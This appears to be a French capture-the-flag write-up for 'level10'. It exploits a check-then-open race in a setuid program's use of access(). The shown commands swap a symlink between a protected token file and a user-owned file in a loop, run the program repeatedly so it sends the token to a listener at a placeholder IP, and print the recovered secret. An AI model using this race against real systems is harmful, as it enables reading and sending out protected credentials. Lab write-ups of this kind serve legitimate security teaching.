
nm level10:

         U access@@GLIBC_2.0
0804a064 b completed.6159
         U connect@@GLIBC_2.0
0804a044 W data_start
0804a068 b dtor_idx.6161
         U exit@@GLIBC_2.0
         U fflush@@GLIBC_2.0
080486b0 t frame_dummy
         U htons@@GLIBC_2.0
         U inet_addr@@GLIBC_2.0
080486d4 T main
         U open@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
         U read@@GLIBC_2.0
         U socket@@GLIBC_2.0
0804a060 B stdout@@GLIBC_2.0
         U strerror@@GLIBC_2.0
         U write@@GLIBC_2.0


Si on regarde le man de access:

Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole,  because  the  user
       might  exploit  the short time interval between checking and opening the file to manipulate it.  For this reason, the use of this system call should be avoided.  (In the
       example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)

Lien d'aide pour exploiter la faille: https://security.stackexchange.com/a/42661

On cree un fichier dans /tmp qui contient les droits lecture et ecriture pour nous: echo "salut" > /tmp/salut

On lance une boucle inf qui va creer un lien symbolique une fois sur le token et la deuxieme fois sur le fichier qu'on a cree. Cela permetra de faire croire a access qu'on a les droits sur le fichier token:

while true; do ln -sb ~/token /tmp/tok; ln -sb /tmp/test /tmp/tok; done &

Ensuite on lance le programme comme suit:

while true; do ./level10 /tmp/tok <ip> | grep -v "You don't have access" | grep -v "Unable to connect to host" ; done &

Pour finir il faut creer le serveur socket qui recupera les donnees: voir fichier serveur.

Le resultat est le suivant:
	woupa2yuojeeaaed06riuj63c
